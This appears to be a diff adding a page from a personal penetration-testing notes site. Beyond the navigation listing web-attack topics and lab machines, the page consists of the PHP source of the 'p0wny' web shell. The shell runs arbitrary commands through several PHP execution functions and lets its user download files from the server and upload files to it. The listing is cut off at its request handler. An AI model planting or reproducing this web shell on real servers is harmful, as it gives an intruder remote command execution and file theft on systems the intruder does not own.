+      <a href="/notes/web/api-testing/">API Testing</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/authentication/">Authentication</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/command-injection/">Command Injection</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/deserialization/">Deserialization</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/file-upload/">File Upload</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/git/">Git</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/graphsql/">Graphsql</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/jwt/">JWT</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/path-traversal/">Path Traversal</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/race-conditon/">Race Conditon</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/ssrf/">SSRF</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/web-cache/">Web Cache</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/wordpress/">Wordpress</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/xss/">XSS</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/xxe/">XXE</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Services</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/services/ftp/">FTP</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/iis/">IIS</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/ldap/">Ldap</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/mssql-mysql/">Mssql-Mysql</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/rpcbind/">RPCbind</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/rsync/">Rsync</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/rtsp/">RTSP</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/smtp/">SMTP</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/snmp/">SNMP</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Labs</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+    <details>
+      <summary>HTB</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/lab/htb/analysis/">Analysis</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/caption/">Caption</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/certified/">Certified</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/cicada/">Cicada</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/hospital/">Hospital</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/infiltrator/">Infiltrator</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/perfection/">Perfection</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/pov/">POV</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Vulnlab</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/lab/vulnlab/baby/">Baby</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/baby2/">Baby2</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/breach/">Breach</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/bruno/">Bruno</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/build/">Build</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/data/">Data</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/delegate/">Delegate</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/escape/">Escape</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/feedback/">Feedback</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/forgotten/">Forgotten</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/heron/">Heron</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/hybrid/">Hybrid</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/lock/">Lock</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/media/">Media</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/reflection/">Reflection</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/retro/">Retro</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/sendai/">Sendai</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/sync/">Sync</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/tea/">Tea</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/tengu/">Tengu</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/trusted/">Trusted</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Pwn-Reverse</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/pwn-reverse/android-emulation/">Android Emulation</a>
+  </li>
+
+  <li>
+    <details>
+      <summary>CTf</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/introduction-to-the-geomyides/">Introduction to the Geomyides</a>
+  </li>
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/keygen-me/">Keygen-Me</a>
+  </li>
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/simple-encryptor/">Simple Encryptor</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Dev</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/code/bash/">Bash</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/c/">C</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/c-/">C&#43;&#43;</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/go/">Go</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/java/">Java</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/lua/">Lua</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/nodejs/">Nodejs</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/php/">Php</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/ruby/">Ruby</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Ressources</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ressources/arch-setup/">Arch-Setup</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/command-linux/">Command Linux</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/debian-setup/">Debian-Setup</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/kvm/">Kvm</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/link/">Link</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/tmux/">Tmux</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Crypto</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/crypto/maths/">Maths</a>
+  </li>
+
+  <li>
+      <a href="/notes/crypto/scripting/">Scripting</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+  </ul>
+</nav>
+
+  
+
+		</div>
+		
+		<nav class="docs-toc d-none d-xl-block col-xl-3" aria-label="Secondary navigation">
+			<div class="page-links">
+  
+</div>
+
+		</nav>
+		<main class="docs-content col-lg-11 col-xl-9">
+		
+			<h1>PownyShell</h1>
+			
+			<nav class="toc-mobile d-xl-none" aria-label="Quaternary navigation">
+				
+			</nav>
+			
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$SHELL_CONFIG</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;username&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;p0wny&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;hostname&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;shell&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">expandPath</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;#^(~[a-zA-Z0-9_.-]*)(/.*)?$#&#34;</span><span class="p">,</span> <span class="nv">$path</span><span class="p">,</span> <span class="nv">$match</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">exec</span><span class="p">(</span><span class="s2">&#34;echo </span><span class="si">$match[1]</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nv">$stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$stdout</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$match</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$path</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">allFunctionExist</span><span class="p">(</span><span class="nv">$list</span> <span class="o">=</span> <span class="k">array</span><span class="p">())</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$list</span> <span class="k">as</span> <span class="nv">$entry</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">function_exists</span><span class="p">(</span><span class="nv">$entry</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">executeCommand</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$output</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">function_exists</span><span class="p">(</span><span class="s1">&#39;exec&#39;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span> <span class="nv">$output</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$output</span> <span class="o">=</span> <span class="nx">implode</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nv">$output</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">function_exists</span><span class="p">(</span><span class="s1">&#39;shell_exec&#39;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$output</span> <span class="o">=</span> <span class="nx">shell_exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">allFunctionExist</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">,</span> <span class="s1">&#39;ob_start&#39;</span><span class="p">,</span> <span class="s1">&#39;ob_get_contents&#39;</span><span class="p">,</span> <span class="s1">&#39;ob_end_clean&#39;</span><span class="p">)))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">ob_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$output</span> <span class="o">=</span> <span class="nx">ob_get_contents</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">ob_end_clean</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">allFunctionExist</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;passthru&#39;</span><span class="p">,</span> <span class="s1">&#39;ob_start&#39;</span><span class="p">,</span> <span class="s1">&#39;ob_get_contents&#39;</span><span class="p">,</span> <span class="s1">&#39;ob_end_clean&#39;</span><span class="p">)))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">ob_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">passthru</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$output</span> <span class="o">=</span> <span class="nx">ob_get_contents</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">ob_end_clean</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">allFunctionExist</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;popen&#39;</span><span class="p">,</span> <span class="s1">&#39;feof&#39;</span><span class="p">,</span> <span class="s1">&#39;fread&#39;</span><span class="p">,</span> <span class="s1">&#39;pclose&#39;</span><span class="p">)))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$handle</span> <span class="o">=</span> <span class="nx">popen</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="nx">feof</span><span class="p">(</span><span class="nv">$handle</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$output</span> <span class="o">.=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$handle</span><span class="p">,</span> <span class="mi">4096</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">pclose</span><span class="p">(</span><span class="nv">$handle</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">allFunctionExist</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;proc_open&#39;</span><span class="p">,</span> <span class="s1">&#39;stream_get_contents&#39;</span><span class="p">,</span> <span class="s1">&#39;proc_close&#39;</span><span class="p">)))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$handle</span> <span class="o">=</span> <span class="nx">proc_open</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="mi">0</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;pipe&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">),</span> <span class="mi">1</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;pipe&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)),</span> <span class="nv">$pipes</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$output</span> <span class="o">=</span> <span class="nx">stream_get_contents</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">proc_close</span><span class="p">(</span><span class="nv">$handle</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$output</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">isRunningWindows</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">stripos</span><span class="p">(</span><span class="k">PHP_OS</span><span class="p">,</span> <span class="s2">&#34;WIN&#34;</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">featureShell</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span> <span class="nv">$cwd</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$stdout</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/^\s*cd\s*(2&gt;&amp;1)?$/&#34;</span><span class="p">,</span> <span class="nv">$cmd</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">chdir</span><span class="p">(</span><span class="nx">expandPath</span><span class="p">(</span><span class="s2">&#34;~&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/^\s*cd\s+(.+)\s*(2&gt;&amp;1)?$/&#34;</span><span class="p">,</span> <span class="nv">$cmd</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">chdir</span><span class="p">(</span><span class="nv">$cwd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/^\s*cd\s+([^\s]+)\s*(2&gt;&amp;1)?$/&#34;</span><span class="p">,</span> <span class="nv">$cmd</span><span class="p">,</span> <span class="nv">$match</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">chdir</span><span class="p">(</span><span class="nx">expandPath</span><span class="p">(</span><span class="nv">$match</span><span class="p">[</span><span class="mi">1</span><span class="p">]));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/^\s*download\s+[^\s]+\s*(2&gt;&amp;1)?$/&#34;</span><span class="p">,</span> <span class="nv">$cmd</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">chdir</span><span class="p">(</span><span class="nv">$cwd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/^\s*download\s+([^\s]+)\s*(2&gt;&amp;1)?$/&#34;</span><span class="p">,</span> <span class="nv">$cmd</span><span class="p">,</span> <span class="nv">$match</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">featureDownload</span><span class="p">(</span><span class="nv">$match</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">chdir</span><span class="p">(</span><span class="nv">$cwd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$stdout</span> <span class="o">=</span> <span class="nx">executeCommand</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">array</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;stdout&#34;</span> <span class="o">=&gt;</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$stdout</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;cwd&#34;</span> <span class="o">=&gt;</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">getcwd</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">featurePwd</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;cwd&#34;</span> <span class="o">=&gt;</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">getcwd</span><span class="p">()));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">featureHint</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span> <span class="nv">$cwd</span><span class="p">,</span> <span class="nv">$type</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">chdir</span><span class="p">(</span><span class="nv">$cwd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$type</span> <span class="o">==</span> <span class="s1">&#39;cmd&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$cmd</span> <span class="o">=</span> <span class="s2">&#34;compgen -c </span><span class="si">$fileName</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$cmd</span> <span class="o">=</span> <span class="s2">&#34;compgen -f </span><span class="si">$fileName</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$cmd</span> <span class="o">=</span> <span class="s2">&#34;/bin/bash -c </span><span class="se">\&#34;</span><span class="si">$cmd\</span><span class="s2">&#34;&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    </span><span class="si">$files</span><span class="s2"> = explode(&#34;</span><span class="nx">\n</span><span class="s2">&#34;, shell_exec(</span><span class="si">$cmd</span><span class="s2">));
+</span></span></span><span class="line"><span class="cl"><span class="s2">    foreach (</span><span class="si">$files</span><span class="s2"> as &amp;</span><span class="si">$filename</span><span class="s2">) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">        </span><span class="si">$filename</span><span class="s2"> = base64_encode(</span><span class="si">$filename</span><span class="s2">);
+</span></span></span><span class="line"><span class="cl"><span class="s2">    }
+</span></span></span><span class="line"><span class="cl"><span class="s2">    return array(
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &#39;files&#39; =&gt; </span><span class="si">$files</span><span class="s2">,
+</span></span></span><span class="line"><span class="cl"><span class="s2">    );
+</span></span></span><span class="line"><span class="cl"><span class="s2">}
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">function featureDownload(</span><span class="si">$filePath</span><span class="s2">) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">    </span><span class="si">$file</span><span class="s2"> = @file_get_contents(</span><span class="si">$filePath</span><span class="s2">);
+</span></span></span><span class="line"><span class="cl"><span class="s2">    if (</span><span class="si">$file</span><span class="s2"> === FALSE) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">        return array(
+</span></span></span><span class="line"><span class="cl"><span class="s2">            &#39;stdout&#39; =&gt; base64_encode(&#39;File not found / no read permission.&#39;),
+</span></span></span><span class="line"><span class="cl"><span class="s2">            &#39;cwd&#39; =&gt; base64_encode(getcwd())
+</span></span></span><span class="line"><span class="cl"><span class="s2">        );
+</span></span></span><span class="line"><span class="cl"><span class="s2">    } else {
+</span></span></span><span class="line"><span class="cl"><span class="s2">        return array(
+</span></span></span><span class="line"><span class="cl"><span class="s2">            &#39;name&#39; =&gt; base64_encode(basename(</span><span class="si">$filePath</span><span class="s2">)),
+</span></span></span><span class="line"><span class="cl"><span class="s2">            &#39;file&#39; =&gt; base64_encode(</span><span class="si">$file</span><span class="s2">)
+</span></span></span><span class="line"><span class="cl"><span class="s2">        );
+</span></span></span><span class="line"><span class="cl"><span class="s2">    }
+</span></span></span><span class="line"><span class="cl"><span class="s2">}
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">function featureUpload(</span><span class="si">$path</span><span class="s2">, </span><span class="si">$file</span><span class="s2">, </span><span class="si">$cwd</span><span class="s2">) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">    chdir(</span><span class="si">$cwd</span><span class="s2">);
+</span></span></span><span class="line"><span class="cl"><span class="s2">    </span><span class="si">$f</span><span class="s2"> = @fopen(</span><span class="si">$path</span><span class="s2">, &#39;wb&#39;);
+</span></span></span><span class="line"><span class="cl"><span class="s2">    if (</span><span class="si">$f</span><span class="s2"> === FALSE) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">        return array(
+</span></span></span><span class="line"><span class="cl"><span class="s2">            &#39;stdout&#39; =&gt; base64_encode(&#39;Invalid path / no write permission.&#39;),
+</span></span></span><span class="line"><span class="cl"><span class="s2">            &#39;cwd&#39; =&gt; base64_encode(getcwd())
+</span></span></span><span class="line"><span class="cl"><span class="s2">        );
+</span></span></span><span class="line"><span class="cl"><span class="s2">    } else {
+</span></span></span><span class="line"><span class="cl"><span class="s2">        fwrite(</span><span class="si">$f</span><span class="s2">, base64_decode(</span><span class="si">$file</span><span class="s2">));
+</span></span></span><span class="line"><span class="cl"><span class="s2">        fclose(</span><span class="si">$f</span><span class="s2">);
+</span></span></span><span class="line"><span class="cl"><span class="s2">        return array(
+</span></span></span><span class="line"><span class="cl"><span class="s2">            &#39;stdout&#39; =&gt; base64_encode(&#39;Done.&#39;),
+</span></span></span><span class="line"><span class="cl"><span class="s2">            &#39;cwd&#39; =&gt; base64_encode(getcwd())
+</span></span></span><span class="line"><span class="cl"><span class="s2">        );
+</span></span></span><span class="line"><span class="cl"><span class="s2">    }
+</span></span></span><span class="line"><span class="cl"><span class="s2">}
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">function initShellConfig() {
+</span></span></span><span class="line"><span class="cl"><span class="s2">    global </span><span class="si">$SHELL_CONFIG</span><span class="s2">;
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">    if (isRunningWindows()) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">        </span><span class="si">$username</span><span class="s2"> = getenv(&#39;USERNAME&#39;);
+</span></span></span><span class="line"><span class="cl"><span class="s2">        if (</span><span class="si">$username</span><span class="s2"> !== false) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">            </span><span class="si">$SHELL_CONFIG[&#39;username&#39;]</span><span class="s2"> = </span><span class="si">$username</span><span class="s2">;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        }
+</span></span></span><span class="line"><span class="cl"><span class="s2">    } else {
+</span></span></span><span class="line"><span class="cl"><span class="s2">        </span><span class="si">$pwuid</span><span class="s2"> = posix_getpwuid(posix_geteuid());
+</span></span></span><span class="line"><span class="cl"><span class="s2">        if (</span><span class="si">$pwuid</span><span class="s2"> !== false) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">            </span><span class="si">$SHELL_CONFIG[&#39;username&#39;]</span><span class="s2"> = </span><span class="si">$pwuid[&#39;name&#39;]</span><span class="s2">;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        }
+</span></span></span><span class="line"><span class="cl"><span class="s2">    }
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">    </span><span class="si">$hostname</span><span class="s2"> = gethostname();
+</span></span></span><span class="line"><span class="cl"><span class="s2">    if (</span><span class="si">$hostname</span><span class="s2"> !== false) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">        </span><span class="si">$SHELL_CONFIG[&#39;hostname&#39;]</span><span class="s2"> = </span><span class="si">$hostname</span><span class="s2">;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    }
+</span></span></span><span class="line"><span class="cl"><span class="s2">}
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">if (isset(</span><span class="si">$_GET[&#34;feature&#34;]</span><span class="s2">)) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">
